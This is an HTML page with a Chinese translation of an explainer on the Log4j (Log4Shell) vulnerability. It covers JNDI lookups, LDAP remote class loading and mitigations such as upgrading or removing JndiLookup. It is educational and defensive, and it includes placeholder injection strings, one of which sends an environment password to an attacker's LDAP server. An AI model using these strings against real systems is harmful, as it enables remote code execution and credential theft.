<html>
<head>
<title>Log4j security vulnerability for dummies</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Log4j虚拟安全漏洞</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/log4j-security-vulnerability-for-dummies-1a3e1269aac0?source=collection_archive---------7-----------------------#2022-01-07">https://levelup.gitconnected.com/log4j-security-vulnerability-for-dummies-1a3e1269aac0?source=collection_archive---------7-----------------------#2022-01-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><figure class="ip iq gp gr ir is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi io"><img src="../Images/ff0e0ba22128475df3a0c8445d72ded8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EMtZW4DwmbvWEX0ZTe3SGg.jpeg"/></div></div><figcaption class="iz ja gj gh gi jb jc bd b be z dk translated">马库斯·斯皮斯克在<a class="ae jd" href="https://unsplash.com/s/photos/hack?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的照片</figcaption></figure><div class=""/><p id="5a9b" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果您在软件行业工作，您肯定听说过log4j库中发现的安全漏洞。即使您没有涉足软件行业，也很有可能听说过这个漏洞，因为它已经被不同的新闻媒体广泛报道。在本文中，我将尝试简化log4j漏洞，该漏洞首先在《我的世界》被发现，并在整个软件行业引发了冲击波。</p><h2 id="ee2c" class="lb lc jg bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">log4j是什么？</h2><p id="d6b6" class="pw-post-body-paragraph kd ke jg kf b kg lu ki kj kk lv km kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">在讨论log4j之前，我们需要知道什么是日志记录。通过日志记录，一种方法是记录应用程序在运行状态下完成的活动，活动可以是任何内容，可能您希望在API被触发时记录API的所有输入，也可能您希望记录API的响应以及所用的时间等等。日志是维护实时软件的最重要的特性之一。如果有适当的日志记录，我们可以立即找到并修复错误。</p><p id="6b2d" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Log4j是一个用Java编写的开源库，广泛用于日志记录。如果一个人正在使用任何java应用程序，那么他很有可能在内部使用log4j。您可能想知道为什么我们需要一个用于日志记录的库。我的意思是，如果一个人只想记录活动，他可以只使用“System.out.println”并打印任何他想打印的内容。嗯，没有人阻止您使用“System.out.println”，但是它将只在控制台上打印日志，或者如果您使用“System.out()”，您可以将“System.out.println”的输出从控制台重定向到文件。但是，在大多数情况下，您需要一些额外的日志记录功能，例如，您需要将日志写入文件并每天创建一个新的日志文件，或者您可能希望具有不同的严重性，例如，在生产环境中，您希望只打印重要的事件，但在测试环境中，您需要打印非常精细的日志，以便轻松找到错误。从技术上来说，如果一个人想自己实现一切都是可能的，但为什么要重新发明轮子。Logs4j提供了一个非常好的接口，提供了几乎所有你能想到的特性。</p><p id="7a84" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">log4j支持的众多特性之一是“<a class="ae jd" href="https://logging.apache.org/log4j/2.x/manual/lookups.html" rel="noopener ugc nofollow" target="_blank">消息查找替换</a>”。在这个特征log4j过程中，一个特定格式的字符串，该格式为$ { prefix:variable name }；其中根据前缀log4j标识变量名应该在哪个特定上下文中被评估。举个例子，如果您想打印环境变量DB_USER的值，您可以简单地打印它，如下所示:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="b792" class="lb lc jg me b gy mi mj l mk ml">logger.error("Database user name is :{}","${env:DB_USER}")</span></pre><p id="0833" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Log4j为不同的上下文提供了许多不同的前缀，如下表所示。</p><figure class="lz ma mb mc gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mm"><img src="../Images/9b6aae1a50a7ea107c05d97e58541e19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O9BFBL_V4KwOqGISs0--DA.png"/></div></div></figure><p id="078b" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您是否想知道，如果日志是如此重要的事情，为什么我们必须依赖一些外部开源库？Java不应该提供开箱即用的东西吗？</p><p id="853d" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">事实证明，Java已经有一个内置的日志框架，名为<a class="ae jd" href="https://docs.oracle.com/javase/6/docs/technotes/guides/logging/" rel="noopener ugc nofollow" target="_blank"> Java日志API </a>，有时也被称为JUL。我们不使用JUL的最大原因之一是它的性能明显较慢。</p><h2 id="f772" class="lb lc jg bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">什么是JNDI？</h2><p id="b35c" class="pw-post-body-paragraph kd ke jg kf b kg lu ki kj kk lv km kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">即使是最高级的软件开发人员也很难理解JNDI。因此，我将尝试向您介绍JNDI的基本概念和JNDI的一些特征，这将有助于您理解log4j漏洞。首先，根据维基百科:</p><blockquote class="mn mo mp"><p id="cb35" class="kd ke mq kf b kg kh ki kj kk kl km kn mr kp kq kr ms kt ku kv mt kx ky kz la ij bi translated"><strong class="kf jh"> Java命名和目录接口</strong> ( <strong class="kf jh"> JNDI </strong>)是一个用于目录服务的Java API，它允许Java软件客户端通过名称发现和查找数据和资源(以Java对象的形式)。</p></blockquote><p id="4ec1" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简单地说，在JNDI的帮助下，您可以从远程位置获取对象，有点像您在响应REST API时获取对象。JNDI提供了多种从远程位置获取对象的机制。在所有机制中，我们将重点关注2种机制，即RMI和LDAP，它们允许开发人员通过<a class="ae jd" href="https://docs.oracle.com/cd/E19396-01/817-7619/intro.html" rel="noopener ugc nofollow" target="_blank">目录</a>服务获取java对象。JNDI为LDAP和RMI提供的一个有趣的特性是，服务器可以发送. class文件的URL，而不是直接发送对象。我不会说太多细节，比如为什么JNDI会有这个功能，它内部是如何工作的，但是你可以从<a class="ae jd" href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html" rel="noopener ugc nofollow" target="_blank">这里</a>阅读。简而言之，如果通过LDAP服务器返回的对象是"<a class="ae jd" href="https://docs.oracle.com/javase/7/docs/api/javax/naming/Reference.html" rel="noopener ugc nofollow" target="_blank"> javax.naming.Reference </a>"类型，那么java可以从object中定义的URL加载java类，并可以在其JVM中执行该类文件。如果不遵循适当的预防措施，这种特征会非常危险。如果某个恶意用户可以破坏您的应用程序所连接的LDAP服务器，他就可以在您的服务器内执行他的程序，导致<a class="ae jd" href="https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/" rel="noopener ugc nofollow" target="_blank">远程代码执行</a>。启动自己的LDAP服务器非常容易，它可以强制应用程序执行任何。您喜欢的类文件，这种LDAP服务器的代码在GitHub中很容易找到，一个这样的例子是<a class="ae jd" href="https://github.com/mbechler/marshalsec" rel="noopener ugc nofollow" target="_blank"> marshalsec </a>。我强烈建议你仔细阅读一下marshal sec repo的自述文件。</p><p id="838b" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在你已经知道了什么是log4j和JNDI，也知道了如何利用JNDI来危害你的应用程序的安全性。</p><p id="bc3d" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，这些无聊的解释已经足够了，您现在已经知道了理解log4j漏洞所需的一切。所以让我们直接进入log4j的故事。</p><p id="2fe3" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Log4j从2001年初开始作为一个开源项目提供，它的积极开发一直持续到2005年左右。2006年出现了一个名为“LogBack”的新项目，据说它是log4j的继任者，不仅性能更好，而且生活质量也更高。在2012年，log4j突然复活了，因为一些开发人员一起重写了log4j的代码，并发布了该库的alpha版本，现在命名为log4j2。两个月后，一个测试版也发布了，在这个阶段，一个新的功能被要求得到JNDI的支持。您想知道为什么需要这个特性吗？用户故事中提到的用例是，您应该能够在不同的文件中编写与特定web上下文相关的日志。现在你可能想知道JNDI将如何帮助它？为了不让你感到困惑，我们改天再谈吧。但是，你应该知道的是，这个功能只有极少数用户使用。不管怎样，让我们继续，这个特性被接受并在2013年7月被添加到主代码中，这是一个让整个世界着火的特性。添加了这个特性后，将会运行如下内容:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="300d" class="lb lc jg me b gy mi mj l mk ml">logger.info("remote object {}",${jndi:ldap://URL_OF_LDAP_SERVER})</span></pre><p id="71e9" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这就对了，现在你知道它的弱点了。还在迷茫？想象一下，你有一个网页，有一个输入框，输入一个字符串，在数据库中搜索，并在网页上显示结果。现在，记录来自用户的输入是非常常见的做法。您的代码中会有类似的内容。</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="3663" class="lb lc jg me b gy mi mj l mk ml">logger.info("Searching {} in database",inputString)</span></pre><p id="07ab" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">你现在明白问题了吗？还是不行？假设有人在搜索框中输入“$ { JNDI:LDAP://URL _ OF _ HIS _ LDAP _ SERVER }”。现在，log4j将尝试使用恶意用户提供的LDAP服务器的URL进行连接。现在黑客可以发送一个“<a class="ae jd" href="https://docs.oracle.com/javase/7/docs/api/javax/naming/Reference.html" rel="noopener ugc nofollow" target="_blank"> javax.naming.Reference </a>类型的对象，该对象将指向他想在你的机器上执行的类。他可以在你的服务器上为所欲为？开计算器？肯定没问题；安装任何恶意软件，肯定也有可能；拿个反壳？可以在几分钟内完成。你现在知道这个漏洞有多危险了。</p><p id="4fa1" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">什么？你真的想看到有人利用这个漏洞的演示吗？没问题，看这个<a class="ae jd" href="https://www.youtube.com/watch?v=7qoPDq41xhQ&amp;t=1056s" rel="noopener ugc nofollow" target="_blank">视频</a>？</p><p id="1722" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好吧，这看起来很龌龊的漏洞？JNDI的事情非常危险？java不应该直接去掉这个特性吗？哦不！java提供了向后兼容性，也就是说，多年前编写的任何代码在最新版本的Java上大部分时间都可以工作，甚至不需要修改任何一行代码。然而，Java已经知道JNDI，所以他们已经发布了一个补丁，禁止从任何外部URL加载. class文件。对于RMI协议，它是固定的，但在LDAP中仍然存在某些远程代码执行代码的情况，所以有人为它打开了一个<a class="ae jd" href="https://bugzilla.redhat.com/show_bug.cgi?id=1639834" rel="noopener ugc nofollow" target="_blank"> bug </a>。最后，在java版本11.0.1、8u191、7u201和6u211中。默认情况下，来自外部URL的类文件被禁用。</p><p id="38ad" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在你因为使用一个不能远程执行代码的java版本而高兴之前，先不要高兴。如果你使用的是正确的java版本，它可以将你从最恶劣的攻击中解救出来，但是你的系统仍然容易受到攻击。您可能想知道，如果代码无法执行，系统如何仍然容易受到攻击。让我给你一个提示；java只禁止从外部URL加载类。还在迷茫？你仍然可以连接LDAP服务器，如果返回的对象是"<a class="ae jd" href="https://docs.oracle.com/javase/7/docs/api/javax/naming/Reference.html" rel="noopener ugc nofollow" target="_blank"> javax.naming.Reference </a>"类型，那么java不会加载这个类，因为这个URL不可信。好吗？那么问题是什么呢？嗯，你可以连接LDAP服务器是一个问题。怎么会？在输入中，可以发送类似“$ { JNDI:LDAP://URL _ OF _ LDAP _ SERVER/$ { env:DB _ PASSWORD } }”的内容。现在，当java调用LDAP服务器时，它还会发送环境变量DB_PASSWORD的值。如果你曾经在IT行业工作过，你就会知道我们有时会以环境变量的形式存储非常重要的信息，比如数据库细节。如果这些关键信息被泄露，将会带来巨大的安全挑战。那么补救办法是什么呢？</p><p id="486a" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">根据log4j维护者的说法，主要修复是将Log4j版本更新到2.3.2(针对Java 6)、2.12.4(针对Java 7)或2.17.1(针对Java 8及更高版本)。如果无法更新版本，只需删除执行JNDI查找“<code class="fe mu mv mw me b"><em class="mq">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</em></code>”的类。</p><h1 id="bf52" class="mx lc jg bd ld my mz na lg nb nc nd lj ne nf ng lm nh ni nj lp nk nl nm ls nn bi translated"><strong class="ak">结论</strong></h1><p id="9572" class="pw-post-body-paragraph kd ke jg kf b kg lu ki kj kk lv km kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">Log4j漏洞告诉我们，尽管开源库很棒，因为有数百名开发人员在开发一个特定的库，但其中仍然可能存在漏洞。然而，甚至每个人都可以看到源代码，但是只有当一个具有正确知识的人查看正确的代码行时，一些错误才会被修复。那么我们应该停止使用开源库吗？肯定不是！</p><p id="6a9a" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">此外，作为人类，我们有将错误推给别人的倾向，许多人会说，一个只会被一小部分用户使用的特性不应该被接受。然而，我们不知道开发者为什么接受这个改变，也许他们认为这会给用户带来更多的价值。此外，人们还应该记住，为这些开源库工作的人是没有报酬的。大公司通过使用这些图书馆赚取了数百万美元，难道这些公司不应该为他们使用的服务支付一些钱吗？</p><p id="2ee0" class="pw-post-body-paragraph kd ke jg kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后我会留给大家一些问题，log4j漏洞从2013年就存在，直到2021年底才被发现。我们可以假设没有人知道这个漏洞的存在吗？或者可能一些组织/政府机构已经知道了。在各种不同的开源库中还存在多少这样的漏洞？</p><h1 id="7e9a" class="mx lc jg bd ld my mz na lg nb nc nd lj ne nf ng lm nh ni nj lp nk nl nm ls nn bi translated">参考</h1><div class="ip iq gp gr ir no"><a href="https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd jh gy z fp nt fr fs nu fu fw jf bi translated">log4j-JNDI-be-gone:CVE的一个简单缓解方案-2021-44228</h2><div class="nv l"><h3 class="bd b gy z fp nt fr fs nu fu fw dk translated">你好，互联网，这是艰难的一周。你可能已经知道，基本上世界上每个Java应用程序都使用…</h3></div><div class="nw l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">research.nccgroup.com</p></div></div><div class="nx l"><div class="ny l nz oa ob nx oc ix no"/></div></div></a></div><div class="ip iq gp gr ir no"><a href="https://research.checkpoint.com/2021/the-laconic-log4shell-faq/" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd jh gy z fp nt fr fs nu fu fw jf bi translated">简洁的Log4Shell FAQ - Check Point研究</h2><div class="nv l"><h3 class="bd b gy z fp nt fr fs nu fu fw dk translated">什么是Log4Shell (CVE-2021-44228)？log4j2中的远程代码执行漏洞，log4j 2是一个流行的日志框架，用于…</h3></div><div class="nw l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">research.checkpoint.com</p></div></div><div class="nx l"><div class="od l nz oa ob nx oc ix no"/></div></div></a></div><div class="ip iq gp gr ir no"><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd jh gy z fp nt fr fs nu fu fw jf bi translated">利用Java | Veracode中的JNDI注入</h2><div class="nv l"><h3 class="bd b gy z fp nt fr fs nu fu fw dk translated">Java命名和目录接口(JNDI)是一个Java API，允许客户端发现和查找数据和对象…</h3></div><div class="nw l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">www.veracode.com</p></div></div><div class="nx l"><div class="oe l nz oa ob nx oc ix no"/></div></div></a></div></div></div>    
</body>
</html>